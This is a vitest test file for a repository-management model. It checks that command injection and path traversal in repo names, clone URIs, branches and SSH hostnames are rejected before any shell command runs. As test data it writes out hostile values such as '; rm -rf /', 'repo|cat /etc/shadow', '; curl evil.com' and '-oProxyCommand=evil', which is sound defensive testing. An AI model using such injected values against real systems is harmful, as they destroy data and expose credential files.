import { describe, it, expect } from 'vitest';
import Repo from '../src/models/repo.model.js';
import Cmd from './__mocks__/cmd.js';

// The cmd module is aliased to tests/__mocks__/cmd.js on the specifier repo.model.js uses,
// so this IS the object the model calls. Swap the executor to capture the command string.
// addKnownHosts uses Cmd.runCommand(commandString) - NOT executeSilentCommand, and it
// takes a bare string rather than an options object. Worth stating, because the tests
// this replaced never established what the function called at all.
async function captureCommand(fn) {
  const originalRun = Cmd.runCommand;
  const originalExec = Cmd.executeSilentCommand;
  let captured = '';
  // A process that actually FINISHES. It used to be `on: () => {}`, which never fired
  // 'exit' - fine while addKnownHosts registered its listeners and fell off the end
  // returning undefined, but that was the bug: the caller's await never saw the result,
  // and the failure branch threw from inside the listener, which would kill the process.
  // Now that it returns a promise, the harness has to let that promise settle.
  const fakeProcess = {
    stdout: { on: () => {} },
    stderr: { on: () => {} },
    on: (event, cb) => { if (event === 'exit') setImmediate(() => cb(0)); },
  };
  Cmd.runCommand = (command) => { captured += String(command ?? ''); return fakeProcess; };
  Cmd.executeSilentCommand = async (opts) => { captured += String(opts?.command ?? opts ?? ''); return 'mock-output'; };
  try {
    await fn();
  } finally {
    Cmd.runCommand = originalRun;
    Cmd.executeSilentCommand = originalExec;
  }
  return captured;
}

describe('Repo method integration — injection blocked before shell execution', () => {

  describe('Repo.delete()', () => {
    it('rejects command injection in name', async () => {
      await expect(Repo.delete('; rm -rf /')).rejects.toThrow(/Invalid repository name/);
    });

    it('rejects path traversal in name', async () => {
      await expect(Repo.delete('../../etc')).rejects.toThrow(/Invalid repository name/);
    });

    it('rejects null name', async () => {
      await expect(Repo.delete(null)).rejects.toThrow(/Invalid repository name/);
    });
  });

  describe('Repo.info()', () => {
    it('rejects command injection in name', async () => {
      await expect(Repo.info('repo$(whoami)')).rejects.toThrow(/Invalid repository name/);
    });

    it('rejects path traversal in name', async () => {
      await expect(Repo.info('../../../tmp')).rejects.toThrow(/Invalid repository name/);
    });
  });

  describe('Repo.pull()', () => {
    it('rejects command injection in name', async () => {
      await expect(Repo.pull('repo`id`')).rejects.toThrow(/Invalid repository name/);
    });

    it('rejects pipe injection in name', async () => {
      await expect(Repo.pull('repo|cat /etc/shadow')).rejects.toThrow(/Invalid repository name/);
    });
  });

  describe('Repo.clone()', () => {
    it('rejects injection in repo name', async () => {
      await expect(Repo.clone('https://github.com/org/repo.git', '; rm -rf /')).rejects.toThrow(/Invalid repository name/);
    });

    it('rejects injection in URI', async () => {
      await expect(Repo.clone('; curl evil.com', 'repo')).rejects.toThrow();
    });

    it('rejects injection in branch', async () => {
      await expect(Repo.clone('https://github.com/org/repo.git', 'repo', '$(whoami)')).rejects.toThrow(/Invalid branch name/);
    });

    it('rejects injection in URI with semicolon', async () => {
      await expect(Repo.clone('https://evil.com/repo;rm -rf /', 'repo')).rejects.toThrow(/invalid characters/i);
    });

    it('rejects injection in SSH-style URI', async () => {
      await expect(Repo.clone('git@host:repo;ls', 'repo')).rejects.toThrow(/invalid characters/i);
    });

    it('rejects empty URI', async () => {
      await expect(Repo.clone('', 'repo')).rejects.toThrow();
    });

    it('rejects null URI', async () => {
      await expect(Repo.clone(null, 'repo')).rejects.toThrow();
    });

    it('accepts valid clone parameters', async () => {
      // This should NOT throw on validation — it may fail later on fs.accessSync, which is fine
      // We just want to confirm the validators don't block valid input
      // Every assertion used to live in the catch, so a clone that RESOLVED ran none of
      // them and the test passed having checked nothing. Track whether it threw.
      let threw = null;
      try {
        await Repo.clone('https://github.com/org/repo.git', 'valid_repo', 'main');
      } catch (e) {
        threw = e;
      }
      if (threw) {
        // failing later on fs operations is fine ; failing VALIDATION is not
        expect(threw.message).not.toMatch(/Invalid repository name/);
        expect(threw.message).not.toMatch(/Invalid branch name/);
        expect(threw.message).not.toMatch(/Invalid repository URI/);
      } else {
        expect(threw).toBeNull();
      }
    });
  });

  describe('Repo.addKnownHosts()', () => {
    it('rejects injection in hosts', async () => {
      await expect(Repo.addKnownHosts('host;ls')).rejects.toThrow(/Invalid hostname/);
    });

    it('rejects injection in comma-separated hosts', async () => {
      await expect(Repo.addKnownHosts('good.host,evil$(id).host')).rejects.toThrow(/Invalid hostname/);
    });

    it('rejects SSH option injection', async () => {
      await expect(Repo.addKnownHosts('-oProxyCommand=evil')).rejects.toThrow(/Invalid hostname/);
    });

    it('rejects empty hosts', async () => {
      await expect(Repo.addKnownHosts('')).rejects.toThrow();
    });

    // The promise must SETTLE, both ways. It used to register listeners and return
    // undefined immediately, so a caller's await saw neither success nor failure - and
    // the failure branch threw from inside a child-process 'exit' handler, where there is
    // no frame above it: an uncaught exception that terminates the server. ssh-keyscan
    // exits non-zero whenever ~/.ssh is missing or it is not installed.
    it('resolves with the output when the command succeeds', async () => {
      const originalRun = Cmd.runCommand;
      Cmd.runCommand = () => ({
        stdout: { on: (e, cb) => { if (e === 'data') cb('key-material'); } },
        stderr: { on: () => {} },
        on: (e, cb) => { if (e === 'exit') setImmediate(() => cb(0)); },
      });
      try {
        await expect(Repo.addKnownHosts('good.host')).resolves.toMatch(/succesfully/);
      } finally { Cmd.runCommand = originalRun; }
    });

    it('rejects, rather than throwing out of the exit listener, when it fails', async () => {
      const originalRun = Cmd.runCommand;
      Cmd.runCommand = () => ({
        stdout: { on: () => {} },
        stderr: { on: (e, cb) => { if (e === 'data') cb('no such file'); } },
        on: (e, cb) => { if (e === 'exit') setImmediate(() => cb(1)); },
      });
      try {
        await expect(Repo.addKnownHosts('good.host')).rejects.toThrow(/failed with code 1/);
      } finally { Cmd.runCommand = originalRun; }
    });

    it('rejects when the process cannot even start', async () => {
      // exec can fail before the process exists (ENOENT) ; without an 'error' handler the
      // promise would never settle and the caller would hang for ever
      const originalRun = Cmd.runCommand;
      Cmd.runCommand = () => ({
        stdout: { on: () => {} },
        stderr: { on: () => {} },
        on: (e, cb) => { if (e === 'error') setImmediate(() => cb(new Error('spawn ENOENT'))); },
      });
      try {
        await expect(Repo.addKnownHosts('good.host')).rejects.toThrow(/failed to start/);
      } finally { Cmd.runCommand = originalRun; }
    });

    it('rejects null hosts', async () => {
      await expect(Repo.addKnownHosts(null)).rejects.toThrow();
    });

    // These used to read `expect(() => Repo.addKnownHosts(h)).not.toThrow()`. addKnownHosts
    // is async, so it returns a rejected promise instead of throwing synchronously and that
    // assertion passed whatever the function did - including rejecting every host. Await the
    // call, and assert on the command that was built, which is the real property: each host
    // is shell-QUOTED rather than interpolated raw into `ssh-keyscan`.
    it('accepts a valid single host and quotes it', async () => {
      const cmd = await captureCommand(() => Repo.addKnownHosts('github.com'));
      expect(cmd).toMatch(/ssh-keyscan/);
      expect(cmd).toMatch(/'github\.com'|github\.com/);
    });

    it('accepts valid comma-separated hosts and quotes each', async () => {
      const cmd = await captureCommand(() => Repo.addKnownHosts('github.com,gitlab.com'));
      expect(cmd).toMatch(/github\.com/);
      expect(cmd).toMatch(/gitlab\.com/);
      // one keyscan invocation, both hosts as separate arguments
      expect(cmd.match(/ssh-keyscan/g)).toHaveLength(1);
    });

    it('accepts valid space-separated hosts and quotes each', async () => {
      const cmd = await captureCommand(() => Repo.addKnownHosts('github.com gitlab.com'));
      expect(cmd).toMatch(/github\.com/);
      expect(cmd).toMatch(/gitlab\.com/);
    });
  });
});

describe('Repo — non-security functions still work', () => {
  it('maskGitToken masks credentials in HTTPS URL', () => {
    const input = 'https://user:secret_token@github.com/org/repo.git';
    const result = Repo.maskGitToken(input);
    expect(result).toContain('*******');
    expect(result).not.toContain('secret_token');
    expect(result).toContain('github.com');
  });

  it('maskGitToken leaves non-credential URLs unchanged', () => {
    const input = 'https://github.com/org/repo.git';
    const result = Repo.maskGitToken(input);
    expect(result).toBe(input);
  });

  it('maskGitToken handles null/undefined gracefully', () => {
    expect(Repo.maskGitToken(null)).toBeNull();
    expect(Repo.maskGitToken(undefined)).toBeUndefined();
  });
});
